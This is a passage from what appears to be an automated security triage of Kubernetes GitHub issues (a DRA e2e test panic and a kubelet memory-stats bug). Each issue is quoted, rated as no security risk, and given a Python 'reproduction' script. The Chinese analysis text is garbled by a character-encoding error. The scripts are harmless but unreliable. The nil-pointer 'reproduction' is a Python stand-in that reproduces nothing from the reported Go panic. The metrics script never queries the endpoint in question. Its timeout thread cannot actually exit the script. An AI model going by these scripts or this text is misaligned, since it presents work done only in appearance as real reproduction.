        resp = stream.stream(v1, pod_name, namespace, command=exec_command, container="test-container", stderr=True, stdin=False, stdout=True, tty=False, _request_timeout=30)
        print("Pod å†…ç¯å¢ƒå˜é‡å¦‚ä¸‹:\n", resp)
    except Exception as e:
        print("æ‰§è¡Œå‘½ä»¤å¤±è´¥:", e)

    # 5. æ£€æŸ¥äº‹ä»¶æ˜¯å¦å­˜åœ¨å…³äºæ— æ•ˆç¯å¢ƒå˜é‡çš„è­¦å‘Š
    try:
        events = v1.list_namespaced_event(namespace=namespace)
        warning_found = False
        for event in events.items:
            if event.involved_object.name == pod_name and event.reason == "InvalidEnvironmentVariableNames":
                warning_found = True
                print("å‘ç°è­¦å‘Šäº‹ä»¶:", event.message)
        if not warning_found:
            print("æœªå‘ç°å…³äºæ— æ•ˆç¯å¢ƒå˜é‡çš„è­¦å‘Šäº‹ä»¶")
    except ApiException as e:
        print("è·å–äº‹ä»¶å¤±è´¥:", e)

    # 6. æ¸…ç†åˆ›å»ºçš„èµ„æº
    clean_up(v1, namespace, pod_name, configmap_name)
    print("æµ‹è¯•å®Œæˆï¼Œèµ„æºå·²æ¸…ç†")

def clean_up(v1, namespace, pod_name, configmap_name):
    try:
        v1.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
        print("Pod åˆ é™¤æˆåŠŸ")
    except ApiException as e:
        print("åˆ é™¤ Pod å¤±è´¥:", e)
    try:
        v1.delete_namespaced_config_map(name=configmap_name, namespace=namespace, body=client.V1DeleteOptions())
        print("ConfigMap åˆ é™¤æˆåŠŸ")
    except ApiException as e:
        print("åˆ é™¤ ConfigMap å¤±è´¥:", e)

# ä½¿ç”¨çº¿ç¨‹æ‰§è¡Œ main å‡½æ•°å¹¶è®¾ç½®è¶…æ—¶ï¼Œç¡®ä¿åœ¨2åˆ†é’Ÿå†…é€€å‡º
def run_with_timeout():
    thread = threading.Thread(target=main)
    thread.start()
    thread.join(timeout=120)
    if thread.is_alive():
        print("è„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼Œé€€å‡º")
        # å¦‚æœéœ€è¦ï¼Œå¯ä»¥åœ¨æ­¤å¤„æ·»åŠ æ›´å®Œå–„çš„é€€å‡ºå¤„ç†

run_with_timeout()
```


---


## Issue #130096 DRAResourceClaimDeviceStatus: E2E test flake

- Issue é“¾æ¥ï¼š[#130096](https://github.com/kubernetes/kubernetes/issues/130096)

### Issue å†…å®¹

#### What happened?

Sometimes, `on single node must be possible for the driver to update the ResourceClaim.Status.Devices once allocated [Feature:DRAResourceClaimDeviceStatus]` fails in ci-kind-dra-all with a panic:

https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kind-dra-all/1889141320082001920

```
STEP: Setting the device status a first time - k8s.io/kubernetes/test/e2e/dra/dra.go:435 @ 02/11/25 03:00:14.898
[PANICKED] Test Panicked
In [It] at: runtime/panic.go:262 @ 02/11/25 03:00:14.898

runtime error: invalid memory address or nil pointer dereference

Full Stack Trace
  k8s.io/kubernetes/test/e2e/dra/test-driver/app.(*ExamplePlugin).UpdateStatus(0x476f900?, {0x7faf200beaa8, 0xc000dc7ce0}, 0xc006d7cd00)
  	k8s.io/kubernetes/test/e2e/dra/test-driver/app/kubeletplugin.go:587 +0x2a
  k8s.io/kubernetes/test/e2e/dra.init.func1.2.11({0x7faf200beaa8, 0xc000dc7ce0})
  	k8s.io/kubernetes/test/e2e/dra/dra.go:450 +0x8a8
```

/sig network
/wg device-management
/cc @LionelJouin @aojea 


#### What did you expect to happen?

No panic.

#### How can we reproduce it (as minimally and precisely as possible)?

Run test repeatedly?

#### Anything else we need to know?

Somehow this does not get picked up by https://storage.googleapis.com/k8s-triage, perhaps because of the empty failure message.


#### Kubernetes version

master

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)




#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°çš„æ˜¯ä¸€ä¸ª E2E æµ‹è¯•ç”¨ä¾‹ä¸­å‡ºç°çš„ panic é”™è¯¯ï¼Œå…·ä½“è¡¨ç°ä¸ºèµ„æºå£°æ˜æ›´æ–°çŠ¶æ€æ—¶å‡ºç°äº†ç©ºæŒ‡é’ˆå¼•ç”¨ï¼ˆnil pointer dereferenceï¼‰çš„é”™è¯¯ã€‚è™½ç„¶ panic ä¼šå¯¼è‡´æµ‹è¯•å¤±è´¥ï¼Œä½†é—®é¢˜å‡ºç°åœ¨æµ‹è¯•ä»£ç åŠå…¶é€»è¾‘ä¸­ï¼Œå¹¶éé’ˆå¯¹ç”Ÿäº§ç¯å¢ƒä¸­ç”¨æˆ·æˆ–ç³»ç»Ÿçš„å®‰å…¨æ”»å‡»å‘é‡ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠè¿œç¨‹æ‰§è¡Œä»£ç ã€æƒé™æå‡ã€æ‹’ç»æœåŠ¡ç­‰å®‰å…¨éšæ‚£ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
"""
æœ¬è„šæœ¬ç”¨äºå¤ç° issue ä¸­æè¿°çš„ panic æƒ…å½¢ï¼Œä½†ç”±äºè¯¥é—®é¢˜å‡ºç°åœ¨æµ‹è¯•ç¯å¢ƒä¸­ï¼Œå¹¶éå®‰å…¨é—®é¢˜ï¼Œ
å› æ­¤æ­¤è„šæœ¬ä¸ä½œå®é™…å±é™©æ“ä½œï¼Œä»…æ¨¡æ‹Ÿå†…å­˜è®¿é—®é”™è¯¯åœºæ™¯ä¾›æœ¬åœ°æµ‹è¯•å’Œç ”ç©¶ä½¿ç”¨ã€‚

è¯·æ³¨æ„ï¼šè¯¥è„šæœ¬ä»…ä¸ºæ¨¡æ‹Ÿ nil pointer dereference é”™è¯¯çš„ç®€å•æ¼”ç¤ºï¼Œä¸ä»£è¡¨çœŸå®ç¯å¢ƒä¸­çš„ä»£ç è¡Œä¸ºã€‚
"""

import time
import threading

def simulate_nil_pointer_dereference():
    # æ¨¡æ‹Ÿä¸€ä¸ªç©ºæŒ‡é’ˆå¼•ç”¨é”™è¯¯
    try:
        ptr = None
        # è¯•å›¾è®¿é—®ç©ºå¯¹è±¡çš„å±æ€§ä¼šå¯¼è‡´ AttributeError å¼‚å¸¸ï¼Œæ¨¡æ‹Ÿ nil pointer dereference
        print(ptr.some_attribute)
    except Exception as e:
        # æ•è·å¼‚å¸¸å¹¶æ‰“å°å †æ ˆä¿¡æ¯
        print("æ¨¡æ‹Ÿ panic: å‘ç”Ÿå¼‚å¸¸ ->", e)

def main():
    # ä¸ºäº†æ¨¡æ‹Ÿæµ‹è¯•ä¸­å¯èƒ½é‡åˆ°çš„éšæœºå¤±è´¥ï¼Œ
    # æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªç®€å•çš„å®šæ—¶ä»»åŠ¡åå¤å°è¯•æ‰§è¡Œè¯¥å‡½æ•°
    stop_event = threading.Event()

    def worker():
        while not stop_event.is_set():
            simulate_nil_pointer_dereference()
            time.sleep(2)  # æ¯2ç§’å°è¯•ä¸€æ¬¡

    # å¯åŠ¨çº¿ç¨‹
    t = threading.Thread(target=worker)
    t.start()

    # è®¾ç½®è¶…æ—¶2åˆ†é’Ÿï¼Œä¹‹ååœæ­¢æ¨¡æ‹Ÿ
    stop_event.wait(timeout=120)
    stop_event.set()
    t.join()
    print("æµ‹è¯•ç»“æŸã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œä»»åŠ¡
main()
```


---


## Issue #130073 kubelet /stats/summary includes terminated init container in memory.usageBytes

- Issue é“¾æ¥ï¼š[#130073](https://github.com/kubernetes/kubernetes/issues/130073)

### Issue å†…å®¹

#### What happened?

For a pod with an init container that copies some files, the `memory.usageBytes` value reported by `kubelet`'s  `/stats/summary` endpoint includes the memory consumption of the init container forever, even though the init container has terminated already.

The value of `memory.usageBytes` differs significantly from what `kubectl top pod` reports for the same pod.

Here is a screenshot where the kubelet reports around 100 MB while `kubectl top` and `k9s` both report 0 MB. (My assumption is that 0 MB is correct for this container and 100 MB is wrong.)

(For the record, kubelet also reports 0 MB when the same pod definition is used, just with the init container removed.)

![Image](https://github.com/user-attachments/assets/85dbe8a1-bece-4b10-95f1-57821eb0c748)


#### What did you expect to happen?

* I expect `kubelet`'s  `/stats/summary` endpoint (and in particular the `memory.usageBytes` value) to only include non-terminated containers of the pod.
* I expect the pod memory usage from `kubectl top pod` and the value of kubelet's `/stats/summary`, `memory.usageBytes` to be the same, or at least close to each other.

#### How can we reproduce it (as minimally and precisely as possible)?

I created a full **reproducer** with instructions here: https://github.com/dash0hq/kubelet-stats-memory-usage-bytes-init-container-issue

#### Anything else we need to know?

I already did a fair bit of analysis by building Kubernetes locally and adding additional logging to what kubelet is doing.

I am pretty sure the root cause is the heuristic by which kubelet picks through the result of the [`getCadvisorContainerInfo(p.cadvisor)`](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go#L172) call to determine whether a container is terminated. For some reason, this heuristic fails to identify the terminated init-container as terminated, and it includes its memory usage into the pods memory usage. From my understanding this is wrong, because a terminated container should not count towards a pod's memory usage.

Here is what happens in more detail:

* kubelet uses the [cri_stats_provider](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go) to collect the metrics (I see there is also cadvisor_stats_provider, not sure how one or the other is selected, YMMV with another provider)
* [`getCadvisorContainerInfo(p.cadvisor)`](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go#L172) uses cadvisor to get metrics for all containers
* The terminated init container is included in cadvisor's response. (I think this is correct as the container has not yet been deleted, and will not as long as the pod is alive)
* [getCRICadvisorStats(allInfos)](https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/stats/cri_stats_provider.go#L176C1-L176C52) is supposed to remove terminated containers from the raw cadvisor results. (`filterTerminatedContainerInfoAndAssembleByPodCgroupKey`)
* The init container in question is not detected by the heuristics used in `filterTerminatedContainerInfoAndAssembleByPodCgroupKey` (I have not analyzed this part in detail yet.)
* The resulting cinfosByPodCgroupKey/allInfos map contains two entries for the pod UID/cgroup key in question, one for the the actual live container (with close to zero memory usage) and the terminated init container (with around 100 MB memory usage) 
* In the loop that iterates over all containers (`for _, stats := range resp {`), the value faulty value from the terminated init container from `allInfos` is picked up and thus included in the response to `/stats/summary`)

One more odd thing: This does not reproduce if the init container simply does something like `stress-ng -m 1 --vm-bytes 100M -t 5` to consume memory. I am not exactly sure why that makes a difference.

#### Kubernetes version

I originally reproduced this on Docker Desktop for MacOS with Kubernetes version v1.30.5. 
<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.30.5
WARNING: version difference between client (1.32) and server (1.30) exceeds the supported minor version skew of +/-1
```

</details>

But the same behavior can also be reproduced when building Kubernetes locally from the current `master` branch (commit 69ab91a5c59617872c9f48737c64409a9dec2957) .

I did that with `kind`:
 
<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.33.0-alpha.1.85+69ab91a5c59617-dirty
```

</details>

#### Cloud provider

N. A.

#### OS version

<details>

I reproduced this is on MacOS with Docker Desktop (version: 4.37.2 (179585)) as well as `kind`. I'll leave the OS details of the kind container here (after `docker exec -it kind-control-plane /bin/bash`):
```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux kind-control-plane 6.10.14-linuxkit #1 SMP Fri Nov 29 17:22:03 UTC 2024 aarch64 GNU/Linux
```

</details>


#### Install tools

<details>
N.A.
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°äº† kubelet åœ¨ç»Ÿè®¡ pod å†…å­˜ä½¿ç”¨é‡æ—¶ï¼Œå°†å·²ç»ˆæ­¢çš„ init å®¹å™¨çš„å†…å­˜ä½¿ç”¨é‡é”™è¯¯åœ°è®¡å…¥äº† pod çš„æ€»ä½“å†…å­˜ä¸­ï¼Œå¯¼è‡´ä¸ â€œkubectl top podâ€ ä»¥åŠå…¶ä»–å·¥å…·ï¼ˆå¦‚ k9sï¼‰æ˜¾ç¤ºçš„æ•°æ®ä¸ç¬¦ã€‚ä»é—®é¢˜æè¿°æ¥çœ‹ï¼Œè¯¥é—®é¢˜å±äºæŒ‡æ ‡è®¡ç®—çš„ bugï¼Œè€Œå¹¶éç”±æ¶æ„æ”»å‡»è§¦å‘æˆ–åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼ˆä¾‹å¦‚ä»£ç æ‰§è¡Œã€æ‹’ç»æœåŠ¡ã€ææƒæˆ–å®¹å™¨é€ƒé€¸ç­‰ï¼‰ã€‚å› æ­¤ï¼Œå…¶æœ¬èº«å¹¶ä¸æ„æˆå®‰å…¨é£é™©ï¼Œä¹Ÿä¸ä¼šä½¿æ”»å‡»è€…è·å¾—é¢å¤–æƒé™æˆ–å½±å“é›†ç¾¤çš„å®‰å…¨æ€§ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
"""
å¤ç°POCè¯´æ˜ï¼š
1. è¯¥è„šæœ¬ä½¿ç”¨ python çš„ kubernetes åº“åœ¨é›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ªåŒ…å« init å®¹å™¨å’Œä¸»å®¹å™¨çš„ podã€‚
2. init å®¹å™¨ç”¨äºæ‰§è¡Œç®€å•æ‹·è´æ“ä½œï¼Œä¸»å®¹å™¨ç®€å•ç¡çœ ä»¥ä¾¿ä¿æŒ pod è¿è¡ŒçŠ¶æ€ã€‚
3. è„šæœ¬ä¼šç­‰å¾… pod è¿›å…¥ Running çŠ¶æ€åï¼Œé€šè¿‡ metrics.k8s.io API ï¼ˆç±»ä¼¼ kubectl topï¼‰è·å–å„å®¹å™¨çš„å†…å­˜ä½¿ç”¨æƒ…å†µã€‚
4. ç”¨æˆ·å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œé€šè¿‡å®˜æ–¹ metrics APIï¼ˆé€šå¸¸ä¸ç»Ÿè®¡å·²ç»ˆæ­¢ init å®¹å™¨çš„å†…å­˜ï¼‰ä¸ kubelet /stats/summaryï¼ˆbug çŠ¶æ€ä¸‹é”™è¯¯è®¡å…¥å†…å­˜ï¼‰æŠ¥å‘Šçš„æ•°æ®å­˜åœ¨å·®å¼‚ã€‚
5. æœ€åï¼Œè„šæœ¬ä¼šæ¸…ç†æ‰€åˆ›å»ºçš„ podã€‚
æ³¨æ„ï¼šè¯¥è„šæœ¬ä»…ç”¨äºå¤ç°é—®é¢˜ç¯å¢ƒï¼ˆæŒ‡æ ‡å·®å¼‚ï¼‰ï¼Œå¹¶æ— å®‰å…¨é£é™©ï¼Œä¸”ä»…ä¾›æœ¬åœ°æµ‹è¯•ä½¿ç”¨ã€‚
"""

import time
import sys
import threading
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# è®¾ç½®æ€»çš„æ‰§è¡Œè¶…æ—¶ï¼ˆå•ä½ç§’ï¼‰ï¼Œç¡®ä¿è„šæœ¬åœ¨2åˆ†é’Ÿå†…é€€å‡º
EXECUTION_TIMEOUT = 120

def create_pod(api_instance, namespace, pod_name):
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod_name},
        "spec": {
            # å®šä¹‰ init å®¹å™¨ï¼šç”¨äºæ‹·è´æ–‡ä»¶ï¼Œæ‰§è¡Œå®Œæ¯•åå³é€€å‡º
            "initContainers": [{
                "name": "init-copy",
                "image": "busybox",
                "command": ["/bin/sh", "-c", "cp /etc/hosts /tmp/hosts-copy"],
            }],
            # ä¸»å®¹å™¨ï¼Œç®€å• sleep ä¿æŒ pod å¤„äº Running çŠ¶æ€
            "containers": [{
                "name": "main",
                "image": "busybox",
                "command": ["/bin/sh", "-c", "sleep 3600"],
            }],
            "restartPolicy": "Never"
        }
    }
    try:
        api_response = api_instance.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        print("Pod å·²åˆ›å»º:", api_response.metadata.name)
    except ApiException as e:
        print("åˆ›å»º Pod æ—¶å‘ç”Ÿå¼‚å¸¸: %s\n" % e)
        sys.exit(1)

def delete_pod(api_instance, namespace, pod_name):
    try:
        api_instance.delete_namespaced_pod(name=pod_name, namespace=namespace)
        print("Pod å·²åˆ é™¤:", pod_name)
    except ApiException as e:
        print("åˆ é™¤ Pod æ—¶å‘ç”Ÿå¼‚å¸¸: %s\n" % e)

def wait_for_pod_ready(api_instance, namespace, pod_name, timeout=60):
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            pod = api_instance.read_namespaced_pod(name=pod_name, namespace=namespace)
        except ApiException:
            time.sleep(2)
            continue
        # åˆ¤æ–­ pod æ˜¯å¦å¤„äº Running çŠ¶æ€ä¸” init å®¹å™¨ç»“æŸ
        if pod.status.phase == "Running":
            # å¦‚æœ init å®¹å™¨å·²ç»“æŸï¼Œå…¶çŠ¶æ€ä¸ä¼šå‡ºç°åœ¨ pod.status.initContainerStatuses ä¸­
            init_statuses = pod.status.init_container_statuses
            # è‹¥ init_container_statuses å­˜åœ¨ï¼Œåˆ™æ£€æµ‹æ˜¯å¦å‡å·²é€€å‡ºï¼ˆstate.terminated çŠ¶æ€ï¼‰
            if init_statuses:
                terminated = all([status.state.terminated is not None for status in init_statuses])
                if terminated:
                    print("Pod {} å·²å°±ç»ª".format(pod_name))
                    return True
            else:
                # å¦‚æœæ²¡æœ‰ init å®¹å™¨çŠ¶æ€ä¿¡æ¯ï¼Œä¹Ÿè§†ä¸ºå°±ç»ª
                print("Pod {} æ—  init å®¹å™¨çŠ¶æ€ä¿¡æ¯ï¼Œè§†ä¸ºå°±ç»ª".format(pod_name))
                return True
        time.sleep(2)
    print("ç­‰å¾… pod {} å°±ç»ªè¶…æ—¶".format(pod_name))
    return False

def get_pod_metrics(custom_api, namespace, pod_name):
    try:
        metrics = custom_api.get_namespaced_custom_object(
            group="metrics.k8s.io",
            version="v1beta1",
            namespace=namespace,
            plural="pods",
            name=pod_name
        )
        return metrics
    except ApiException as e:
        print("è·å– pod metrics æ—¶å‘ç”Ÿå¼‚å¸¸: %s\n" % e)
        return None

def main():
    # æ³¨å†Œä¸€ä¸ªå®šæ—¶å™¨ï¼Œç¡®ä¿æ€»æ‰§è¡Œæ—¶é—´ä¸è¶…è¿‡ EXECUTION_TIMEOUT ç§’
    timer = threading.Timer(EXECUTION_TIMEOUT, lambda: sys.exit("æ‰§è¡Œè¶…æ—¶ï¼Œè„šæœ¬é€€å‡º"))
    timer.start()
    
    # åŠ è½½ Kubernetes é…ç½®ï¼ˆé»˜è®¤ä» ~/.kube/config åŠ è½½ï¼‰
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥: %s" % e)
        sys.exit(1)
    
    core_v1 = client.CoreV1Api()
    custom_api = client.CustomObjectsApi()
    
    namespace = "default"
    pod_name = "init-container-test"
    
    # åˆ›å»º pod
    create_pod(core_v1, namespace, pod_name)
    
    # ç­‰å¾… pod å°±ç»ª
    if not wait_for_pod_ready(core_v1, namespace, pod_name, timeout=60):
        delete_pod(core_v1, namespace, pod_name)
        sys.exit(1)
    
    # å°è¯•è·å– pod metricsï¼Œè¯¥ metrics é€šå¸¸æ¥è‡ª metrics serverï¼ˆå¦‚ kubectl top æ˜¾ç¤ºæ•°æ®ï¼‰
    metrics = get_pod_metrics(custom_api, namespace, pod_name)
    if metrics:
        print("ä» metrics.k8s.io è·å–åˆ° pod èµ„æºä½¿ç”¨æƒ…å†µï¼š")
        for container in metrics.get("containers", []):
            name = container.get("name")
            usage = container.get("usage", {})
            memory = usage.get("memory")
            cpu = usage.get("cpu")
            print("  å®¹å™¨åï¼š{}ï¼ŒCPUï¼š{}ï¼Œå†…å­˜ï¼š{}".format(name, cpu, memory))
    else:
        print("æœªèƒ½è·å–åˆ° pod çš„ metricsã€‚")
    
    # æç¤ºï¼šè¯¥å¤ç°ä¸»è¦ç”¨äºåˆ›å»ºå¸¦æœ‰ init å®¹å™¨çš„ podï¼Œå¹¶è§‚å¯Ÿä¸åŒå·¥å…·ï¼ˆå¦‚ metrics API ä¸ kubelet /stats/summaryï¼‰å¯¹å†…å­˜ç»Ÿè®¡çš„å·®å¼‚ã€‚
    print("\næ³¨æ„ï¼škubelet /stats/summary ç«¯ç‚¹çš„å†…å­˜ç»Ÿè®¡é—®é¢˜éœ€è¦é€šè¿‡èŠ‚ç‚¹ç›´æ¥è®¿é—®è¯¥ HTTP æ¥å£æ¥éªŒè¯ï¼Œæ­¤è„šæœ¬ä»…å¤ç°äº† pod éƒ¨ç½²å’Œ metrics æ•°æ®è·å–ã€‚")
    
    # æ¸…ç†åˆ›å»ºçš„ pod
    delete_pod(core_v1, namespace, pod_name)
    
    timer.cancel()
    print("è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


---


